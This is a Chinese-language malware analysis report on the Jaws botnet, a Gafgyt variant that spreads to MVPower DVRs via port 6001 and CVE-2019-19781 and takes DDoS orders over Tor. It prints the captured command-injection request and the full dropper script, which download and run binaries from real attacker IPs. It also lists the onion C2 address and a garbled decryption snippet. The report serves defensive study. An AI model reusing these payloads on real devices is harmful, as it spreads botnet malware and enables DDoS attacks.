# Gafgyt变种——Jaws僵尸网络的分析报告
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 背景
2021年2月19日，蜜罐系统捕捉到针对`MVPower model
TV-7104HE(EDB_41471)`设备的远程投递样本，经跟踪发现脚本回连下载地址：http://45.145.185.83/jaws.sh，在2月19日、2月23日、2月24日分别更新了样本的版本。短时间内如此快速地更新版本，比较特殊，故对此进行研究。经过分析，我们确定这是一个借鉴了前代Gafgyt家族的部分代码，通过6001端口远程投递传播，针对MVPower设备，主要目的是为DDOS攻击的新型僵尸网络，附带了内存查杀特殊功能。它的字符串利用古典加密算法，加密字符串及命令信息，通过内置TOR
代理节点与`TOR C2`进行通信。
考虑到僵尸网络最开始远程下载是通过jaws.sh传播的，我们就将其命名为
`Jaws`。Jaws样本，内置了DDoS攻击、弱口令扫描、漏洞利用、内存查杀等功能模块。传播功能，主要是通过对80、8080端口的弱口令扫描和利用CVE-2019-19781漏洞来传播自己。最主要的DDoS功能模块，支持UDP_Flood、TCP_Flood、DNS等攻击指令，样本基本流程图如图1所示：
图1：Jaws流程图
## 传播
目前Jaws通过6001端口传播，捕获到的payload如下所示，主要功能是从远程主机`45.245.36.128`下载并执行脚本。
    GET /shell?cd%20%2Ftmp%3Bwget%20http%3A%2F%2F172.245.36.128%2Fjaws.sh%20-O%20jaws.sh%3Bsh%20.%2Fjaws.sh%3Brm%20-f%20jaws.sh HTTP/1.1\r\nHost: *.*.*.*:6001\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.25.0\r\n\r\n
脚本如下所示，主要功能是从远程主机下载执行相关CPU架构的Jaws样本。
    #!/bin/sh
    cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /root || cd / ;
    #cd $(find / -writable -readable -executable | head -n 1)
    curl http://45.145.185.83/bins/AJhkewbfwefWEFarm -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm -O AJhkewbfwefWEFarm; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm -O AJhkewbfwefWEFarm; chmod 777 AJhkewbfwefWEFarm; ./AJhkewbfwefWEFarm; rm -rf AJhkewbfwefWEFarm
    curl http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O AJhkewbfwefWEFarm5; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O AJhkewbfwefWEFarm5; chmod 777 AJhkewbfwefWEFarm5; ./AJhkewbfwefWEFarm5; rm -rf AJhkewbfwefWEFarm5
    #curl http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O AJhkewbfwefWEFarm7; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O AJhkewbfwefWEFarm7; chmod 777 AJhkewbfwefWEFarm7; ./AJhkewbfwefWEFarm7; rm -rf AJhkewbfwefWEFarm7
## 样本分析：
Jaws
支持的X86、X32、Mips、Arm等架构。根据蜜罐捕获到的时间线，在2月19日、2月23日、2月24日分别更新了样本第一版，第二版，第三版。本文选取第三版X86的样本作为分析对象，UPX脱壳后的样本信息如下：
MD5 cd3b462b35d86fcc26e4c1f50e421add
SHA-1 de83609a63d74c8fc66e2321529439d242d99472
SHA-256 1b3bb39a3d1eea8923ceb86528c8c38ecf9398da1bdf8b154e6b4d0d8798be49
Vhash fe08080a2e5f04d3e80ce84669835519
File type ELF
Magic ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked,
not stripped
样本功能比较简单，运行后首先输出`Error during non-blocking operation:
EWOULDBLOCK`字符串以迷惑用户；之后随机生成12位字符串重命名进程；接着进行持久化控制，将自己设置为守护进程，并把自己写入开机自启；随后对被感染主机文件进行读取，并持续扫描内存，关闭一些相关进程；接着对TOR
代理节点列表进行初始化，随机和TOR代理建立通信，最终通过代理和TOR C2 进行通信，等待执行C2 下发指令，进行后续操作。
### **解密敏感字符串**
通过IDA可以看到Jaws将敏感的资源信息都加密存储，以防止相关功能和代码被分析和检测。敏感资源解密后，可以得到TOR C2 和 C2相关指令，如图2
所示：
图2 加密字符串
解密脚本如下所示：
    str="\"?>K!tF>iorZ:ww_uBw3Bw"# str = "|6e"encodes='%q*KC)&F98fsr2to4b3yi_:wB>z=;!k?"EAZ7.D-mdv3):
    foriinrange(0,0x40):
    if (str[v3] ==encodes[i]):
    str1=decoded[i]
    print(str1,end="")
    v3=v3+1
解密后字符串包括 `TOR C2 ：wvp3te7pkfczmnnl.onion`
端口号：`29401`，相关DDoS攻击指令：`UDP、HTTP、TLS、DNS`等。
### **进程重命名**
重命名成大小相间的长度为12的进程名，逃避检测。如图3，图4所示：
图3 随机生成进程名
图4 进程名称
### **进程持久化控制**
通过对进程进行`setid`设置，让进程成为僵尸进程，持久运行在后台。通过把文件写入`/etc/rc.loacl`中，实现开机自启动，达到持久化控制的目的。如图5所示：
图5 持久化处理
### **内存扫描**
为了达到只有自己运行的目的，Jaws样本开启一个进程，持续对宿主机内存进行扫描，对内置的硬编码bot字符串进行检测。若扫描出相关进程，则关掉，如图6，图7所示：
图6 内存扫描
图7 遍历KnownBots列表
### **TOR C2 通信**
Jaws样本的TOR 代理通信可以分为3步：
#### **1.初始化TOR代理节点。**
Jaws样本内置了TOR 代理节点，在第一版和第二版中，内置了20个，第三版内置了125个TOR
代理节点。先初始化代理节点，其中的代理有部分重复。如图8所示：
图8 初始化Tor代理节点
#### **2\. 和TOR C2 建立通信。**
通过随机数对124个节点取余，选择随机代理节点进行尝试连接，并设置`stage`标志位为1，如图9所示：
图9 随机选择Tor代理节点连接
当代理节点有响应是，进入`stage`循环，向代理节点发送解码后的`TOR
C2和Port`信息，其中端口为29401，并设置`tor_state`标志位，如图10所示：
图10 发送Tor C2 信息
当代理节点回复正确上线包后，向TOR代理发送 Bot信息，进入`Case3`循环 并等待 `TOR C2` 的 PING 和指令，如图11所示：
图11 接收Tor C2响应包
#### **3.TOR C2 命令**
在与TOR C2建立联系后，采用心跳包保持长连接。等待指令，针对样本支持的命令。如图12，图13，图14所示：
  1. HOLD: 连接到IP地址和端口，持续特定时间
  2. JUNK: 与HOLD类似，但是会发送随机生成的字符串到IP地址
  3. UDP: 用洪泛UDP包的方式攻击设备
  4. ACK: 发送ACK信号来破坏网络活动
  5. VSE: 用来消耗目标资源的放大攻击
  6. TCP: 发送无数的TCP请求
  7. OVH: 用来绕过DDOS缓解服务的DDOS攻击